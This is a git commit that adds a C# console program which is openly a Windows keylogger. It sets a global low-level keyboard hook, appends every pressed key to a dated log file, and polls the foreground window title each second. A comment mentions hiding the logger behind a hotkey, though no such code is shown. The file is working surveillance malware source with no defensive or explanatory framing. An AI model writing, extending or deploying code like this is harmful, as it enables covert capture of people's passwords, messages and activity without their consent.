3563e5cf9c85548bb635b8854fa9d5552e6a93e5
OS <OS@DESKTOP-PPOG0J8>
2020-12-22 22:40:02 +0700

    Add project files.

---
+++ Program.cs
@@ -0,0 +1,204 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.IO;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace WindowsFormsApp1
+{
+    class Program
+    {
+        #region hook key board
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+
+        private static LowLevelKeyboardProc _proc = HookCallback;
+        private static IntPtr _hookID = IntPtr.Zero;
+
+        private static string logName = "Log_";
+        private static string logExtendtion = ".txt";
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook,
+            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+            IntPtr wParam, IntPtr lParam);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        public static extern int GetWindowThreadProcessId(IntPtr windowHandle, out int processId);
+        [DllImport("user32.dll")]
+        public static extern int GetWindowText(int hWnd, StringBuilder text, int count);
+       
+
+        /// <summary>
+        /// Delegate a LowLevelKeyboardProc to use user32.dll
+        /// </summary>
+        /// <param name="nCode"></param>
+        /// <param name="wParam"></param>
+        /// <param name="lParam"></param>
+        /// <returns></returns>
+        private delegate IntPtr LowLevelKeyboardProc(
+        int nCode, IntPtr wParam, IntPtr lParam);
+
+        /// <summary>
+        /// Set hook into all current process
+        /// </summary>
+        /// <param name="proc"></param>
+        /// <returns></returns>
+        private static IntPtr SetHook(LowLevelKeyboardProc proc)
+        {
+            using (Process curProcess = Process.GetCurrentProcess())
+            {
+                using (ProcessModule curModule = curProcess.MainModule)
+                {
+                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+                    GetModuleHandle(curModule.ModuleName), 0);
+                }
+            }
+        }
+
+        /// <summary>
+        /// Every time the OS call back pressed key. Catch them 
+        /// then cal the CallNextHookEx to wait for the next key
+        /// </summary>
+        /// <param name="nCode"></param>
+        /// <param name="wParam"></param>
+        /// <param name="lParam"></param>
+        /// <returns></returns>
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+
+                WriteLog(vkCode);
+            }
+            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        }
+
+        /// <summary>
+        /// Write pressed key into log.txt file
+        /// </summary>
+        /// <param name="vkCode"></param>
+        static void WriteLog(int vkCode)
+        {
+            Console.WriteLine((Keys)vkCode);
+            string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
+            StreamWriter sw = new StreamWriter(logNameToWrite, true);
+            sw.Write((Keys)vkCode);
+            sw.Close();
+        }
+
+        /// <summary>
+        /// Start hook key board and hide the key logger
+        /// Key logger only show again if pressed right Hot key
+        /// </summary>
+        /// private string lastWindowTitle;
+        private string lastWindowTitle;
+        private void WriteCurrentWindowInformation()
+        {
+            var activeWindowId = GetForegroundWindow();
+            if (activeWindowId.Equals(0))
+            {
+                return;
+            }
+
+            int processId;
+           GetWindowThreadProcessId(activeWindowId, out processId);
+
+            if (processId == 0)
+            {
+                return;
+            }
+
+            Process foregroundProcess = Process.GetProcessById(processId);
+            var windowTitle = string.Empty;
+
+            try
+            {
+                if (!string.IsNullOrEmpty(foregroundProcess.MainWindowTitle))
+                {
+                    windowTitle = foregroundProcess.MainWindowTitle;
+                }
+            }
+            catch (Exception)
+            {
+            }
+
+            try
+            {
+                if (string.IsNullOrEmpty(windowTitle))
+                {
+                    const int Count = 1024;
+                    var sb = new StringBuilder(Count);
+                    GetWindowText((int)activeWindowId, sb, Count);
+
+                    windowTitle = sb.ToString();
+                }
+            }
+            catch (Exception)
+            {
+            }
+
+            if (lastWindowTitle != windowTitle)
+            {
+
+                Console.WriteLine("Time: {0}\nWindowTitle: {1}\n",
+                    DateTime.Now.ToString("dd/MM/yyyy  HH:mm:ss"),
+                    windowTitle);
+
+                lastWindowTitle = windowTitle;
+            }
+        }
+        static void StartTimmer()
+        {
+            Program program = new Program();
+            Thread thread = new Thread(() => {
+                while (true)
+                {
+                    Thread.Sleep(1000);
+
+                   
+           
+              program.WriteCurrentWindowInformation();
+                }
+            });
+            thread.IsBackground = true;
+            thread.Start();
+        }
+        static void HookKeyboard()
+        {
+            _hookID = SetHook(_proc);
+            Application.Run();
+            UnhookWindowsHookEx(_hookID);
+        }
+        #endregion
+
+
+        static void Main(string[] args)
+        {
+            StartTimmer();
+            HookKeyboard(); 
+
+        }
+    }
+}
